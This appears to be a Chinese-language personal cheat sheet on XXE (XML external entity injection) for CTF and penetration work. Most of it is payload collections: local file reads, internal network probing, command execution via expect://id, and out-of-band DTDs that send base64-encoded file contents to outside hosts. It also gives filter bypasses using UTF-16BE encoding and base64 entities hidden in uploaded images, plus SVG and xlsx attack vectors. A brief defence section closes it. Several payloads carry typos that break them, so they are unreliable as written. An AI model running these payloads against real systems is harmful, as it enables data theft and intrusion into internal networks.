![image-20210830102020800](D:\BaiduNetdiskDownload\安全\XXE&XML之利用检测绕过\XXE&XML之利用检测绕过.assets\image-20210830102020800.png)



[CTF XXE - MustaphaMond - 博客园 (cnblogs.com)](https://www.cnblogs.com/20175211lyz/p/11413335.html)

## XML

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。

## XXE

XXE漏洞全称XML External Entity Injection,即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

## XML与HTML的主要差异

XML被设计为传输和存储数据，其焦点是数据的内容。
HTML被设计用来显示数据，其焦点是数据的外观。
HTML旨在显示信息而XML旨在传输信息。

## 玩法

```
#读文件
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///d://test.txt">
]>
<x>&xxe;</x>

#内网探针或攻击内网应用(触发漏洞地址)
<?xml version="1.0" encoding="UTF-8"?>
<! DOCTYPE foo [
<! ELEMENT foo ANY >
<! ENTITY rabbit SYSTEM "http://192.168.0.103:8081/index.txt"
>
]>
<x>&rabbit;</x>


#RCE
该cAsE是在安装e xpect扩展的PHp环境里执行系统命令
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "expect://id">
]>
<x>&xxe;</x>



#引入外部实体dtd
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY 8 file SYSTEM "http://127.0.0.1:8081/evil2. dtd">
    %file;
]>
<x>&send;</x>

evil2.dtd:
<!ENTITY send SYSTEM "file:///d:/test.txt">


#无回显-读取文件
<?xm1 version="1.0"?>
<IDOCTYPE test [
<!ENTItY % file SYSTEM "php:// filter/read=convert.base64-encode/resource=d:/test.txt">
<!ENTITY % dtd SYSTEM "http://192.168.0.103:8081/test.dtd">
&dtd;
&send;

test.dtd:
<!ENTity 8 payload
	"<!ENTITY &#x25; send SYSTEM
'http://192.168.0.103:8081/ ?data=sfile; '>"
%payload;


#协议-读文件(绕过)
<?xml veraion = "1.0"2>
<IDOCTYPE ANY [ < !ENTITY f SYSTEM
"php://filter/read=convert.base64-encode/resource=xxe.php">
]>
<x>&f;</x>

```

## 绕过方式

ENTITY``SYSTEM``file等关键词被过滤**

使用编码方式绕过：UTF-16BE
`cat payload.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml`

若http被过滤，可以

data://协议绕过**

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % a " <!ENTITY %  b SYSTEM 'http://118.25.14.40:8200/hack.dtd'> "> 
    %a;
    %b;
]>
<test>&hhh;</test>
```

file://协议加文件上传**

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % a SYSTEM "file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg">
    %a;
]>
<!--上传文件-->
<!ENTITY % b SYSTEM 'http://118.25.14.40:8200/hack.dtd'>
```

php://filter协议加文件上传**

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % a SYSTEM "php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg">
    %a;
]>
    <test>
        &hhh;
    </test>

<!--上传文件-->
<!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'>
```

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % a SYSTEM "php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg">
    %a;
]>
    <test>
        &hhh;
    </test>
<!--上传文件-->
PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==
```

```
PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==
```

## 利用场景

svg

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```

tips:从当前文件夹读取文件可以使用`/proc/self/cwd`

excel

[利用EXCEL进行XXE攻击](https://xz.aliyun.com/t/3741)
首先用excel创建一个空白的xlsx，然后解压

```
mkdir XXE && cd XXE
unzip ../XXE.xlsx
```

将`[Content_Types].xml`改成恶意xml，再压缩回去

```
zip -r ../poc.xlsx *
```

## XXE防御

[未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)

- 方案一、使用开发语言提供的禁用外部实体的方法
  PHP：libxml_disable_entity_loader(true);
  其他语言:https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet
- 方案二、过滤用户提交的XML数据
  关键词：`，`,`SYSTEM`和`PUBLIC`。
